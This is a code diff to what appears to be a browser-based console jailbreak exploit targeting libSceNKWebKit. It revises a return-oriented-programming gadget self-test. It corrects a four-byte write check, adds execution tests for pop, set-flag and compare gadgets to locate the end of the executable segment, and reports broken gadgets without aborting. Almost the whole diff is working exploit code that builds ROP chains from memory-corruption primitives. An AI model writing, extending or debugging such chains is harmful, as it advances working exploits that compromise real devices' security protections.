@@ -1242,6 +1242,10 @@ async function prepare(p) {
            A few reloads therefore enumerate every broken gadget instead of
            re-finding the first one forever. */
         ps.gt = ps.gt || {};
+        /* push_write4's recorded failure was my check demanding hi === 0 of a
+           four-byte store. Drop stale verdicts whose test has since changed,
+           rather than leaving a correct gadget marked broken. */
+        if (ps.gtRev !== 2) { delete ps.gt["push_write4"]; ps.gtRev = 2; }
         const gtSave = () => psSave();
         for (const k in ps.gt) if (ps.gt[k] === "pending") {
             ps.gt[k] = "CRASH";
@@ -1314,14 +1318,65 @@ async function prepare(p) {
             // push_write4 uses `mov [rdi], eax`, a different store from the
             // 8-byte path, so it needs its own check. Both go through runTest
             // so they are skipped once decided, like every other test.
+            /* push_write4 is a FOUR byte store, so it must leave the high
+               dword alone. Checking hi === 0 was my error, not the gadget's:
+               it reported 0xdead000041424344, which is the filler above and
+               the value below -- exactly correct behaviour. */
+            p.write8(out, new int64(0xDEAD0000, 0xDEAD0000));
             await runTest("push_write4", () => {
                 chain.push_write4(out, 0x41424344);
-            }, (v) => eq(v, 0x41424344, 0), true);
+            }, (v) => eq(v, 0x41424344, 0xDEAD0000), true);
 
             p.write8(cell, new int64(0x55667788, 0x00009900));
             await runTest("push_copy8", () => {
                 chain.push_copy8(out, cell);
             }, (v) => eq(v, 0x55667788, 0x00009900), true);
+
+            /* Every gadget verified so far sits at or below rva 0x12A439 and
+               every broken one at or above 0x572686 -- nothing straddles. That
+               is the shape of a segment boundary, not five unlucky addresses:
+               libSceNKWebKit's executable text appears to end between those,
+               and the generator harvested "gadgets" out of the data beyond it,
+               which fault the moment they are executed.
+               Test the rest in ASCENDING rva order so the point where they
+               start failing localises that boundary. Each one only has to
+               execute, consume the slots the profile implies, and return --
+               MAGIC2 loaded afterwards proves the chain stayed in sync. */
+            const V = new int64(0x41414141, 0x00004141);
+            const MAGIC2 = new int64(0x5A5A5A5A, 0x00005A5A);
+            const r9zero = (typeof OFFSET_wk_r9_zero_only !== "undefined")
+                && OFFSET_wk_r9_zero_only;
+            const pop1 = (n) => () => { chain.push(gadgets[n]); chain.push(V); };
+            const flag0 = (n) => () => { chain.push(gadgets[n]); };
+            const EXEC = [
+                ["sete al", flag0("sete al")],
+                ["setb al", flag0("setb al")],
+                ["inc dword [rax]", () => {
+                    chain.push(gadgets["pop rax"]); chain.push(cell);
+                    chain.push(gadgets["inc dword [rax]"]);
+                }],
+                ["pop rdx", pop1("pop rdx")],
+                ["seta al", flag0("seta al")],
+                ["pop r8", pop1("pop r8")],
+                ["setl al", flag0("setl al")],
+                ["pop r9", () => {
+                    chain.push(gadgets["pop r9"]);
+                    if (!r9zero) chain.push(V);   // the stand-in eats no slot
+                }],
+                ["setg al", flag0("setg al")],
+                ["cmp [rcx], eax", () => {
+                    chain.push(gadgets["pop rcx"]); chain.push(cell);
+                    chain.push(gadgets["pop rax"]); chain.push(new int64(0, 0));
+                    chain.push(gadgets["cmp [rcx], eax"]);
+                }]
+            ];
+            for (const [nm, build] of EXEC) {
+                if (!(nm in wk_gadgetmap)) continue;
+                await runTest("exec:" + nm, () => {
+                    build();
+                    chain.push(gadgets["pop rax"]); chain.push(MAGIC2);
+                }, (v) => eq(v, MAGIC2.low, MAGIC2.hi));
+            }
 
             crumb("g:done");
             jbmark("GADGET-SELFTEST", bad.length
@@ -1329,10 +1384,11 @@ async function prepare(p) {
                 : "all verified by execution (load, add, shifts, write4, copy8,"
                 + " and four no-arg syscalls)");
             if (bad.length)
-                throw new Error("gadget self-test: these produced the wrong result"
-                    + " when actually executed -- " + bad.join("  ")
-                    + " -- the addresses in offsets/" + window.fw_str + ".js are"
-                    + " wrong, exactly like mov [rdi],rsi was.");
+                jbmark("GADGET-BROKEN", bad.join("  ")
+                    + " || these addresses in offsets/" + window.fw_str + ".js do"
+                    + " not do what the profile says. Reporting rather than"
+                    + " aborting: the chain works without the ones it never"
+                    + " uses, and each completed run tells us more than a stop.");
         } catch (e) {
             if (String(e.message || e).indexOf("gadget self-test") === 0) throw e;
             jbmark("GADGET-SELFTEST", "aborted: " + (e.message || e));
@@ -1345,4 +1401,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=35`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=36`);
